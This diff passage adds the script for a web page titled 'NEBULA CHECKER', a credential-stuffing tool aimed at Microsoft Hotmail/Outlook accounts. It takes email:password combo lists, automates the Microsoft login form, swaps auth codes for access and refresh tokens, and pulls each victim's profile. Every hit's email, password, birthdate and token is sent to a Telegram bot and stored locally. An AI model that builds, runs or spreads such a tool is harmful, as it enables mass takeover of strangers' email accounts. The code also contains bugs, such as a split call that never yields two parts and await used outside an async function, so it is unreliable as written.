+                neuralCtx.moveTo(x, y);
+                neuralCtx.lineTo(x - (p.target.x - p.start.x) * 0.08, y - (p.target.y - p.start.y) * 0.08);
+                neuralCtx.strokeStyle = p.color + '40';
+                neuralCtx.lineWidth = 1;
+                neuralCtx.stroke();
+
+                neuralCtx.beginPath();
+                neuralCtx.arc(x, y, 2.5, 0, Math.PI * 2);
+                neuralCtx.fillStyle = p.color;
+                neuralCtx.shadowColor = p.color;
+                neuralCtx.shadowBlur = 8;
+                neuralCtx.fill();
+                neuralCtx.shadowBlur = 0;
+
+                return true;
+            });
+
+            requestAnimationFrame(animateNeural);
+        }
+
+        // ==================== STATS NEURAL ====================
+        const statsNeuralCanvas = document.getElementById('stats-neural-canvas');
+        const statsNeuralCtx = statsNeuralCanvas.getContext('2d');
+        let statsNodes = [], statsConnections = [], statsPackets = [];
+
+        function resizeStatsNeural() {
+            const rect = statsNeuralCanvas.parentElement.getBoundingClientRect();
+            statsNeuralCanvas.width = rect.width - 24;
+            statsNeuralCanvas.height = 100;
+            initStatsNeural();
+        }
+
+        function initStatsNeural() {
+            statsNodes = []; statsConnections = [];
+            const cols = 8, rows = 3;
+            const colStep = statsNeuralCanvas.width / (cols + 1);
+            const rowStep = statsNeuralCanvas.height / (rows + 1);
+
+            for (let c = 0; c < cols; c++) {
+                for (let r = 0; r < rows; r++) {
+                    statsNodes.push({
+                        x: (c + 1) * colStep,
+                        y: (r + 1) * rowStep,
+                        intensity: 0.2,
+                        col: c, row: r
+                    });
+                }
+            }
+
+            statsNodes.forEach((node, i) => {
+                statsNodes.forEach((other, j) => {
+                    if (i !== j && Math.abs(node.col - other.col) <= 1 && Math.random() > 0.85) {
+                        statsConnections.push({ from: node, to: other, intensity: 0 });
+                    }
+                });
+            });
+        }
+
+        function animateStatsNeural() {
+            statsNeuralCtx.fillStyle = 'rgba(5, 5, 16, 0.2)';
+            statsNeuralCtx.fillRect(0, 0, statsNeuralCanvas.width, statsNeuralCanvas.height);
+
+            statsConnections.forEach(conn => {
+                conn.intensity *= 0.90;
+                if (conn.intensity > 0.01) {
+                    statsNeuralCtx.strokeStyle = `rgba(0, 240, 255, ${conn.intensity * 0.2})`;
+                    statsNeuralCtx.lineWidth = 0.6;
+                    statsNeuralCtx.beginPath();
+                    statsNeuralCtx.moveTo(conn.from.x, conn.from.y);
+                    statsNeuralCtx.lineTo(conn.to.x, conn.to.y);
+                    statsNeuralCtx.stroke();
+                }
+            });
+
+            statsNodes.forEach(node => {
+                node.intensity *= 0.90;
+                const radius = 2 + node.intensity * 1.5;
+                statsNeuralCtx.beginPath();
+                statsNeuralCtx.arc(node.x, node.y, radius, 0, Math.PI * 2);
+                statsNeuralCtx.fillStyle = node.intensity > 0.4 ? '#00ff88' : `rgba(0, 240, 255, ${0.2 + node.intensity * 0.3})`;
+                statsNeuralCtx.fill();
+            });
+
+            // Reactive packets based on activity
+            if (window.checkActivity) {
+                if (Math.random() > 0.7) {
+                    const startNode = statsNodes[Math.floor(Math.random() * statsNodes.length)];
+                    const endNode = statsNodes[Math.floor(Math.random() * statsNodes.length)];
+                    if (startNode && endNode && startNode !== endNode) {
+                        statsPackets.push({
+                            start: startNode, target: endNode,
+                            progress: 0,
+                            speed: 0.02 + Math.random() * 0.02,
+                            color: PACKET_COLORS[Math.floor(Math.random() * PACKET_COLORS.length)]
+                        });
+                    }
+                }
+            }
+
+            statsPackets = statsPackets.filter(p => {
+                p.progress += p.speed;
+                if (p.progress >= 1) {
+                    p.target.intensity = 0.8;
+                    statsConnections.filter(c => c.from === p.target).forEach(c => c.intensity = 0.6);
+                    return false;
+                }
+
+                const x = p.start.x + (p.target.x - p.start.x) * p.progress;
+                const y = p.start.y + (p.target.y - p.start.y) * p.progress;
+
+                statsNeuralCtx.beginPath();
+                statsNeuralCtx.arc(x, y, 2, 0, Math.PI * 2);
+                statsNeuralCtx.fillStyle = p.color;
+                statsNeuralCtx.shadowColor = p.color;
+                statsNeuralCtx.shadowBlur = 6;
+                statsNeuralCtx.fill();
+                statsNeuralCtx.shadowBlur = 0;
+
+                return true;
+            });
+
+            requestAnimationFrame(animateStatsNeural);
+        }
+
+        // Initialize everything - with longer delays for proper sizing
+        setTimeout(() => { 
+            resizeNeural(); 
+            animateNeural(); 
+        }, 100);
+        
+        setTimeout(() => { 
+            resizeNeural(); 
+            animateNeural(); 
+            resizeStatsNeural();
+            animateStatsNeural();
+        }, 500);
+        
+        setTimeout(() => { 
+            resizeNeural(); 
+            animateNeural(); 
+            resizeStatsNeural();
+            animateStatsNeural();
+        }, 1000);
+        
+        // Ensure canvases are always visible - keep animations running
+        function ensureAnimations() {
+            resizeNeural();
+            resizeStatsNeural();
+            requestAnimationFrame(animateNeural);
+            requestAnimationFrame(animateStatsNeural);
+        }
+        
+        // Keep neural network visible with periodic bursts
+        setInterval(() => {
+            if (nodes && nodes.length > 0) {
+                // Random burst to keep it visible
+                const randomNode = nodes[Math.floor(Math.random() * nodes.length)];
+                if (randomNode) {
+                    randomNode.intensity = 0.3;
+                }
+                // Also add some packet activity
+                const startNode = nodes[Math.floor(Math.random() * nodes.length)];
+                const endNode = nodes[Math.floor(Math.random() * nodes.length)];
+                if (startNode && endNode && startNode !== endNode) {
+                    packets.push({
+                        start: startNode,
+                        target: endNode,
+                        progress: 0,
+                        speed: 0.015 + Math.random() * 0.015,
+                        success: false,
+                        color: PACKET_COLORS[Math.floor(Math.random() * PACKET_COLORS.length)]
+                    });
+                }
+            }
+            if (statsNodes && statsNodes.length > 0) {
+                const randomNode = statsNodes[Math.floor(Math.random() * statsNodes.length)];
+                if (randomNode) {
+                    randomNode.intensity = 0.3;
+                }
+            }
+        }, 1500);
+        
+        window.addEventListener('resize', () => {
+            resizeNeural();
+            resizeStatsNeural();
+        });
+
+        // ==================== CLOCK ====================
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').textContent = now.toLocaleTimeString('en-US', { 
+                hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' 
+            });
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // ==================== UI ====================
+        const threadSlider = document.getElementById('thread-slider');
+        const threadVal = document.getElementById('thread-val');
+        threadSlider.addEventListener('input', () => threadVal.textContent = threadSlider.value);
+
+        const proxyToggle = document.getElementById('proxy-toggle');
+        let proxyEnabled = false;
+        proxyToggle.addEventListener('click', () => {
+            proxyEnabled = !proxyEnabled;
+            proxyToggle.classList.toggle('toggle-active', proxyEnabled);
+        });
+
+        const tgToggle = document.getElementById('tg-toggle');
+        let tgEnabled = false;
+        tgToggle.addEventListener('click', () => {
+            tgEnabled = !tgEnabled;
+            tgToggle.classList.toggle('toggle-active', tgEnabled);
+        });
+
+        // ==================== RAW LOG ====================
+        const rawLog = document.getElementById('raw-log');
+
+        function addLog(message, type = 'info') {
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            const line = document.createElement('div');
+            line.className = 'log-line';
+
+            let colorClass = 'log-info';
+            if (type === 'hit') colorClass = 'log-hit';
+            else if (type === 'bad') colorClass = 'log-bad';
+            else if (type === '2fa') colorClass = 'log-2fa';
+            else if (type === 'warn') colorClass = 'log-warn';
+
+            line.innerHTML = `<span class="log-time">[${time}]</span><span class="${colorClass}">${message}</span>`;
+            rawLog.appendChild(line);
+            rawLog.scrollTop = rawLog.scrollHeight;
+
+            while (rawLog.children.length > 200) {
+                rawLog.removeChild(rawLog.firstChild);
+            }
+        }
+
+        // ==================== TELEGRAM ====================
+        let tgBotToken = localStorage.getItem('tg_bot_token') || '';
+        let tgChatId = localStorage.getItem('tg_chat_id') || '';
+        document.getElementById('tg-bot-token').value = tgBotToken;
+        document.getElementById('tg-chat-id').value = tgChatId;
+
+        async function sendTelegram(message) {
+            if (!tgEnabled || !tgBotToken || !tgChatId) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${tgBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: tgChatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {}
+        }
+
+        document.getElementById('tg-test').addEventListener('click', () => {
+            tgBotToken = document.getElementById('tg-bot-token').value.trim();
+            tgChatId = document.getElementById('tg-chat-id').value.trim();
+            if (!tgBotToken || !tgChatId) {
+                addLog('TELEGRAM: Missing token or chat ID', 'warn');
+                return;
+            }
+            sendTelegram('<b>🔥 NEBULA CHECKER</b>\nTest message - connection established');
+            addLog('TELEGRAM: Test message sent', 'info');
+        });
+
+        document.getElementById('tg-save').addEventListener('click', () => {
+            tgBotToken = document.getElementById('tg-bot-token').value.trim();
+            tgChatId = document.getElementById('tg-chat-id').value.trim();
+            localStorage.setItem('tg_bot_token', tgBotToken);
+            localStorage.setItem('tg_chat_id', tgChatId);
+            addLog('TELEGRAM: Credentials saved', 'info');
+        });
+
+        // ==================== GIANT POPUP ====================
+        function showGiantPopup(data) {
+            document.getElementById('giant-email').textContent = data.email;
+            document.getElementById('giant-pass').textContent = data.password;
+            document.getElementById('giant-name').textContent = data.name || 'N/A';
+            document.getElementById('giant-country').textContent = data.country || 'N/A';
+            document.getElementById('giant-dob').textContent = data.birthdate || 'N/A';
+            document.getElementById('giant-lang').textContent = data.mailbox_lang || 'N/A';
+            document.getElementById('giant-tz').textContent = data.mailbox_tz || 'N/A';
+            document.getElementById('giant-token').textContent = (data.access_token || '').substring(0, 50) + '...';
+            
+            const modal = document.getElementById('giant-modal');
+            if (data.country === 'AU') {
+                modal.classList.add('australia-popup');
+                playAustraliaJingle();
+            } else {
+                modal.classList.remove('australia-popup');
+            }
+            
+            document.getElementById('giant-popup').classList.add('active');
+        }
+
+        function closeGiantPopup() {
+            document.getElementById('giant-popup').classList.remove('active');
+        }
+
+        // ==================== CHECKER ENGINE ====================
+        let isRunning = false;
+        let combos = [];
+        let currentIndex = 0;
+        let hits = 0;
+        let checked = 0;
+        let activeWorkers = 0;
+        let resultsList = [];
+
+        const startBtn = document.getElementById('start-btn');
+        const stopBtn = document.getElementById('stop-btn');
+        const comboInput = document.getElementById('combo-input');
+        const resultsListEl = document.getElementById('results-list');
+        const systemPulse = document.getElementById('system-pulse');
+
+        // Global activity flag for stats neural
+        window.checkActivity = false;
+
+        function updateStats() {
+            document.getElementById('stat-total').textContent = combos.length;
+            document.getElementById('stat-checked').textContent = checked;
+            document.getElementById('stat-hits').textContent = hits;
+            const rate = checked > 0 ? ((hits / checked) * 100).toFixed(1) : 0;
+            document.getElementById('stat-rate').textContent = rate + '%';
+
+            const progress = combos.length > 0 ? (checked / combos.length) : 0;
+            const circumference = 2 * Math.PI * 26;
+            const offset = circumference - (progress * circumference);
+            document.getElementById('progress-circle').style.strokeDashoffset = offset;
+            document.getElementById('progress-percent').textContent = Math.round(progress * 100) + '%';
+            document.getElementById('progress-fraction').textContent = `${checked}/${combos.length}`;
+        }
+
+        function addHitCard(data) {
+            const card = document.createElement('div');
+            card.className = 'hit-card';
+            card.innerHTML = `
+                <div class="hit-email">◈ ${data.email}</div>
+                <div class="hit-pass">${data.password}</div>
+                <div class="hit-name">${data.name || 'N/A'} | ${data.country || 'N/A'}</div>
+                <div class="hit-token">${(data.access_token || '').substring(0, 35)}...</div>
+            `;
+            resultsListEl.insertBefore(card, resultsListEl.firstChild);
+            
+            // Neural burst
+            const randomNode = nodes[Math.floor(Math.random() * nodes.length)];
+            randomNode.intensity = 1;
+            connections.filter(c => c.from === randomNode).forEach(c => c.intensity = 0.8);
+            
+            // Stats neural burst
+            const statsRandomNode = statsNodes[Math.floor(Math.random() * statsNodes.length)];
+            if (statsRandomNode) {
+                statsRandomNode.intensity = 1;
+                statsConnections.filter(c => c.from === statsRandomNode).forEach(c => c.intensity = 0.8);
+            }
+            
+            // Save result
+            resultsList.push(data);
+            saveResults();
+            
+            // Play country sound
+            if (data.country) {
+                playCountrySound(data.country);
+            }
+            
+            // Show giant popup
+            showGiantPopup(data);
+            
+            // Telegram
+            sendTelegram(`<b>🎯 NEBULA HIT</b>\n\n<b>Email:</b> <code>${data.email}</code>\n<b>Pass:</b> <code>${data.password}</code>\n<b>Name:</b> ${data.name}\n<b>Country:</b> ${data.country}\n<b>DOB:</b> ${data.birthdate}\n<b>Token:</b> <code>${(data.access_token || '').substring(0, 60)}...</code>`);
+            
+            updateStats();
+        }
+
+        function saveResults() {
+            const lines = resultsList.map(r => `${r.email}:${r.password}|${r.access_token ? r.access_token.substring(0, 60) : ''}...`).join('\n');
+            localStorage.setItem('nebula_valid.txt', lines);
+        }
+
+        function triggerStatsNeural() {
+            window.checkActivity = true;
+            setTimeout(() => { window.checkActivity = false; }, 500);
+        }
+
+        async function checkHotmail(email, password) {
+            // Multi-colored packet
+            const color = PACKET_COLORS[Math.floor(Math.random() * PACKET_COLORS.length)];
+            const startNode = nodes[Math.floor(Math.random() * nodes.length)];
+            const endNode = nodes[Math.floor(Math.random() * nodes.length)];
+            packets.push({
+                start: startNode, target: endNode,
+                progress: 0,
+                speed: 0.015 + Math.random() * 0.015,
+                success: false,
+                color: color
+            });
+
+            try {
+                const url = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
+                    + "client_info=1&haschrome=1&login_hint=" + encodeURIComponent(email)
+                    + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+                    + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+                    + "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D");
+
+                const ua = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";
+
+                const resp = await fetch(url, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': ua,
+                        'Accept': 'text/html,application/xhtml+xml',
+                        'X-Requested-With': 'com.microsoft.outlooklite'
+                    },
+                    redirect: 'follow'
+                });
+
+                const text = await resp.text();
+
+                let PPFT = "", urlPost = "";
+
+                const match = text.match(/var ServerData = ({.*?});/);
+                if (match) {
+                    try {
+                        const sd = JSON.parse(match[1]);
+                        const sFTTag = sd.sFTTag || '';
+                        if (sFTTag) {
+                            const ppftMatch = sFTTag.match(/value="([^"]+)"/);
+                            if (ppftMatch) PPFT = ppftMatch[1];
+                        }
+                        urlPost = sd.urlPost || '';
+                    } catch(e) {}
+                }
+
+                if (!PPFT) {
+                    const start = text.indexOf('name="PPFT" value="');
+                    if (start !== -1) {
+                        const valStart = start + 'name="PPFT" value="'.length;
+                        const valEnd = text.indexOf('"', valStart);
+                        if (valEnd !== -1) PPFT = text.substring(valStart, valEnd);
+                    }
+                }
+
+                if (!urlPost) {
+                    const match2 = text.match(/"urlPost":"([^"]+)"/);
+                    if (match2) urlPost = match2[1];
+                }
+
+                if (!PPFT || !urlPost) {
+                    return { valid: false, reason: 'failed_to_get_form' };
+                }
+
+                const data = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&` +
+                    `lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}` +
+                    `&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=` +
+                    `&PPFT=${encodeURIComponent(PPFT)}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0` +
+                    `&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772`;
+
+                const postResp = await fetch(urlPost, {
+                    method: 'POST',
+                    headers: {
+                        'User-Agent': ua,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Origin': 'https://login.live.com',
+                        'Referer': resp.url
+                    },
+                    body: data,
+                    redirect: 'manual'
+                });
+
+                let authCode = "";
+                const respCookies = postResp.headers.get('set-cookie') || '';
+                
+                if (!respCookies.includes('__Host-MSAAUTHP')) {
+                    return { valid: false, reason: 'invalid_credentials' };
+                }
+
+                if (postResp.status >= 300 && postResp.status < 400) {
+                    const loc = postResp.headers.get('Location') || '';
+                    if (loc.includes('msauth://') && loc.includes('code=')) {
+                        authCode = loc.split('code=')[1].split('&')[0];
+                    }
+                } else {
+                    const postText = await postResp.text();
+
+                    if (postText.includes('two factor') || postText.includes('2FA') || postText.includes('additional verification') || 
+                        postText.includes('prove you') || postText.includes('security code') || postText.includes('verify')) {
+                        return { valid: false, reason: '2FA_REQUIRED', is2fa: true };
+                    }
+
+                    const m = postText.match(/window\.location\s*=\s*["']([^"']+)["']/);
+                    if (m && m[1].includes('msauth://') && m[1].includes('code=')) {
+                        authCode = m[1].split('code=')[1].split('&')[0];
+                    }
+                }
+
+                if (!authCode) {
+                    return { valid: false, reason: 'invalid_credentials' };
+                }
+
+                // Exchange for token
+                const tokenData = {
+                    client_id: "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+                    grant_type: "authorization_code",
+                    code: authCode,
+                    redirect_uri: "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+                    scope: "profile openid offline_access https://outlook.office.com/M365.Access"
+                };
+
+                const tokenResp = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(tokenData)
+                });
+
+                if (tokenResp.status !== 200) {
+                    return { valid: false, reason: 'token_exchange_failed' };
+                }
+
+                const tokenJson = await tokenResp.json();
+                const accessToken = tokenJson.access_token || "";
+
+                if (!accessToken) {
+                    return { valid: false, reason: 'no_token' };
+                }
+
+                // Fetch account profile via Substrate API
+                let profileData = {};
+                try {
+                    const profileResp = await fetch("https://outlook.office.com/api/v2.0/me", {
+                        headers: {
+                            'Authorization': `Bearer ${accessToken}`,
+                            'User-Agent': 'Outlook-Android/2.0'
+                        }
+                    });
+                    if (profileResp.status === 200) {
+                        profileData = await profileResp.json();
+                    }
+                } catch(e) {
+                    console.log('Profile fetch error:', e);
+                }
+
+                return {
+                    valid: true,
+                    access_token: accessToken,
+                    refresh_token: tokenJson.refresh_token || '',
+                    email: email,
+                    password: password,
+                    name: profileData.displayName || profileData.name || email.split('@')[0],
+                    country: profileData.mailboxState || 'N/A',
+                    birthdate: profileData.birthday || 'N/A',
+                    mailbox_lang: profileData.mailboxLanguages || 'en',
+                    mailbox_tz: 'UTC'
+                };
+
+            } catch (error) {
+                console.error('Check error:', error);
+                return { valid: false, reason: 'error: ' + error.message };
+            }
+        }
+
+        function worker() {
+            while (isRunning && currentIndex < combos.length) {
+                const idx = currentIndex++;
+                if (idx >= combos.length) break;
+
+                const combo = combos[idx];
+                const keyword = document.getElementById('keyword-input').value.trim();
+                
+                // Apply keyword filter
+                if (keyword && !combo.email.toLowerCase().includes(keyword.toLowerCase()) && 
+                    !combo.password.toLowerCase().includes(keyword.toLowerCase())) {
+                    continue;
+                }
+
+                addLog(`Checking: ${combo.email}`, 'info');
+                triggerStatsNeural();
+                
+                const result = await checkHotmail(combo.email, combo.password);
+
+                checked++;
+                triggerStatsNeural();
+
+                if (result.valid) {
+                    hits++;
+                    addLog(`✓ HIT | ${combo.email} | ${result.name} | ${result.country}`, 'hit');
+                    addHitCard(result);
+                } else if (result.is2fa) {
+                    addLog(`⚠ 2FA | ${combo.email} | ${result.reason}`, '2fa');
+                } else {
+                    addLog(`✗ BAD | ${combo.email} | ${result.reason}`, 'bad');
+                }
+
+                updateStats();
+            }
+
+            activeWorkers--;
+            if (activeWorkers <= 0) {
+                isRunning = false;
+                addLog('Check complete!', 'info');
+                startBtn.style.display = 'inline-block';
+                stopBtn.style.display = 'none';
+            }
+        }
+
+        // ==================== BUTTON HANDLERS ====================
+        document.getElementById('paste-btn').addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                comboInput.value = text;
+                addLog(`Pasted ${text.split('\n').length} lines`, 'info');
+            } catch(e) {
+                addLog('Paste failed', 'warn');
+            }
+        });
+
+        document.getElementById('clear-btn').addEventListener('click', () => {
+            comboInput.value = '';
+            addLog('Cleared', 'info');
+        });
+
+        document.getElementById('start-btn').addEventListener('click', function() {
+            console.log('START CLICKED');
+            const text = comboInput.value.trim();
+            if (!text) {
+                addLog('No combos loaded', 'warn');
+                return;
+            }
+
+            combos = [];
+            text.split('\n').forEach(line => {
+                line = line.trim();
+                if (line && line.includes(':')) {
+                    const parts = line.split(':', 1);
+                    if (parts.length === 2) {
+                        combos.push({ email: parts[0].trim().toLowerCase(), password: parts[1].trim() });
+                    }
+                }
+            });
+
+            if (!combos.length) {
+                addLog('No valid combos found', 'warn');
+                return;
+            }
+
+            isRunning = true;
+            currentIndex = 0;
+            checked = 0;
+            hits = 0;
+            activeWorkers = 0;
+
+            startBtn.style.display = 'none';
+            stopBtn.style.display = 'inline-block';
+
+            addLog(`Starting check on ${combos.length} accounts...`, 'info');
+            updateStats();
+
+            const threads = parseInt(threadSlider.value);
+            console.log('Threads:', threads, 'Combos:', combos.length);
+            
+            for (let i = 0; i < threads; i++) {
+                activeWorkers++;
+                worker();
+            }
+        });
+
+        document.getElementById('stop-btn').addEventListener('click', function() {
+            isRunning = false;
+            addLog('Stopping...', 'warn');
+            startBtn.style.display = 'inline-block';
+            stopBtn.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
